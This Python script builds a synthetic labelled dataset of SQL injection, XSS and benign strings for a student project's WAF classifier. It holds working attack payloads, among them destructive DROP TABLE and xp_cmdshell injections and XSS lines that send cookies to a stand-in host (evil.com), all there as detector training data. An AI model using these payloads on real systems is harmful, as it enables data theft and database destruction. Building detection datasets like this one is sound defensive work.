"""
Generates the synthetic training dataset for the Hybrid WAF ML detector.

This is a prototype/MVP dataset for a student capstone project (per the
SRS) — a curated, labeled corpus of representative SQLi/XSS signature
patterns plus benign values, NOT traffic collected from a real system and
NOT a claim of exhaustive attack coverage.

Each row is tagged with a `group_id` identifying which base payload/phrase
it was templated from. This is required for leakage-safe train/test
splitting (see training/train.py) — GroupShuffleSplit keeps every variant
of the same base template on one side of the split, so the model is
evaluated on genuinely unseen patterns rather than near-duplicates of
training rows.

Run: python -m dataset.generate_dataset
"""

from __future__ import annotations

import csv
import itertools
from pathlib import Path

OUTPUT_PATH = Path(__file__).parent / "dataset.csv"

TABLES = ["users", "accounts", "members", "admin_users"]
COLUMNS = [("username", "password"), ("email", "id"), ("name", "role")]
DELAY_SECONDS = ["3", "5", "8"]


def case_variants(text: str) -> list[str]:
    variants = {text, text.upper()}
    # A mixed-case variant is a common obfuscation for XSS filters.
    mixed = "".join(c.upper() if i % 2 == 0 else c for i, c in enumerate(text))
    variants.add(mixed)
    return list(variants)


# --- SQL Injection base templates -------------------------------------------------
# "{table}" / "{col1}"/"{col2}" / "{n}" are substituted where present.
SQLI_BASE_TEMPLATES = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin'--",
    "' OR 'a'='a",
    "1' OR '1' = '1",
    "x' AND 1=1 --",
    "1 OR 1=1",
    "' UNION SELECT NULL,NULL--",
    "1 UNION SELECT {col1}, {col2} FROM {table}",
    "' UNION SELECT database(),user()--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "1 OR SLEEP({n})",
    "'; WAITFOR DELAY '0:0:{n}'--",
    "1 AND BENCHMARK(3000000,MD5(1))",
    "1; DROP TABLE {table}",
    "1; DELETE FROM {table} WHERE 1=1",
    "'; INSERT INTO {table} VALUES('x')--",
    "1' #",
    "' /*comment*/ OR '1'='1",
    "'; EXEC xp_cmdshell('dir')--",
    "1); EXEC master..xp_cmdshell 'whoami'--",
    "' OR ''='",
    '" OR "1"="1',
    "1' AND '1'='1",
    "' HAVING 1=1--",
    "' GROUP BY columnnames HAVING 1=1--",
    "%27 OR 1=1--",
    "1' ORDER BY 10--",
    "' OR SLEEP(5)#",
]

# --- XSS base templates ------------------------------------------------------------
XSS_BASE_TEMPLATES = [
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script src=//evil.com/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    '<a href="javascript:alert(1)">click</a>',
    "javascript:alert(document.cookie)",
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
    "<script>fetch(document.cookie)</script>",
    "<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",
    "<svg/onload=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)></video>",
    "<details open ontoggle=alert(1)>",
    "'-alert(1)-'",
    '"><script>alert(1)</script>',
    "<script>window.location='http://evil.com/steal?c='+document.cookie</script>",
    "<style>@import 'javascript:alert(1)';</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<table background=javascript:alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>",
]

# --- Benign base phrases -----------------------------------------------------------
NAMES = ["alice", "bob", "carol", "dave"]
CITIES = ["Hanoi", "Da Nang", "Ho Chi Minh City", "Hue"]
NUMBERS = ["7", "42", "108", "256"]

NORMAL_BASE_TEMPLATES = [
    "best coffee near me",
    "how to reset my password",
    "search for blue shoes size 10",
    "{name}@example.com",
    "please update my address to 123 Main St",
    "I love this product, will buy again!",
    "{number}",
    "what is the weather like in {city} today",
    "add item to cart",
    "checkout with credit card",
    "user {name} logged in successfully",
    "order number {number} has shipped",
    "great customer service, thank you",
    "how do I cancel my subscription",
    "the meeting is scheduled for 3pm tomorrow",
    "{name} updated their profile picture",
    "compare prices for laptops under $1000",
    "recipe for chocolate chip cookies",
    "flight from {city} to Singapore",
    "please contact support for further assistance",
    "the product arrived damaged, requesting refund",
    "book a table for two at 7pm",
    "latest news about renewable energy",
    "how to learn TypeScript in 30 days",
    "quarterly sales report for {city} branch",
    "{name} left a 5 star review",
    "reset password link sent to your email",
    "tracking number for order {number}",
    "subscribe to our monthly newsletter",
    "directions to the nearest train station",
    # Hard negatives: contain SQLi/XSS-adjacent tokens in clearly benign
    # contexts, so the classifier (and the Phase 5 rule engine, for the
    # later comparison) are tested on more than trivially-separable text.
    "please select your country from the list",
    "or would you like to unsubscribe instead",
    "the temperature is below 1 degree today",
    "5 < 10 and 10 > 5 are both true",
    "use the <b>bold</b> button to format your text",
    "it's a great day, isn't it",
    "O'Brien confirmed the reservation for {number} guests",
    "drop by our store this weekend for a sale",
    "insert a new payment method before checkout",
    "delete old messages to free up space",
    "the discount code is valid until 2026 -- act fast",
    "sign up for the creative writing and script workshop this friday",
    "please click <here> to continue",
    "comment: 'nice service, 5 stars'",
    "update your notification preferences anytime",
]


def build_sqli_rows() -> list[tuple[str, str, str]]:
    rows = []
    for idx, template in enumerate(SQLI_BASE_TEMPLATES):
        group_id = f"sqli_{idx}"
        variants: set[str] = set()

        if "{table}" in template or "{col1}" in template:
            for table, (col1, col2) in itertools.product(TABLES, COLUMNS):
                variants.add(template.format(table=table, col1=col1, col2=col2, n="5"))
        elif "{n}" in template:
            for n in DELAY_SECONDS:
                variants.add(template.format(n=n))
        else:
            variants.update(case_variants(template))

        for text in variants:
            rows.append((text, "SQL_INJECTION", group_id))
    return rows


def build_xss_rows() -> list[tuple[str, str, str]]:
    rows = []
    for idx, template in enumerate(XSS_BASE_TEMPLATES):
        group_id = f"xss_{idx}"
        for text in case_variants(template):
            rows.append((text, "XSS", group_id))
    return rows


def build_normal_rows() -> list[tuple[str, str, str]]:
    rows = []
    for idx, template in enumerate(NORMAL_BASE_TEMPLATES):
        group_id = f"normal_{idx}"
        variants: set[str] = set()

        if "{name}" in template:
            for name in NAMES:
                variants.add(template.format(name=name, number="0", city=""))
        elif "{number}" in template:
            for number in NUMBERS:
                variants.add(template.format(number=number, name="", city=""))
        elif "{city}" in template:
            for city in CITIES:
                variants.add(template.format(city=city, name="", number="0"))
        else:
            variants.add(template)

        for text in variants:
            rows.append((text, "NORMAL", group_id))
    return rows


def main() -> None:
    rows = build_sqli_rows() + build_xss_rows() + build_normal_rows()

    # Cleaning: strip whitespace, drop empties, drop exact-duplicate text
    # (duplicates add no training signal and could straddle the split).
    seen_text: set[str] = set()
    cleaned: list[tuple[str, str, str]] = []
    for text, label, group_id in rows:
        text = text.strip()
        if not text or text in seen_text:
            continue
        seen_text.add(text)
        cleaned.append((text, label, group_id))

    with OUTPUT_PATH.open("w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["text", "label", "group_id"])
        writer.writerows(cleaned)

    counts: dict[str, int] = {}
    for _, label, _ in cleaned:
        counts[label] = counts.get(label, 0) + 1
    print(f"Wrote {len(cleaned)} rows to {OUTPUT_PATH}")
    print(f"Class counts: {counts}")


if __name__ == "__main__":
    main()
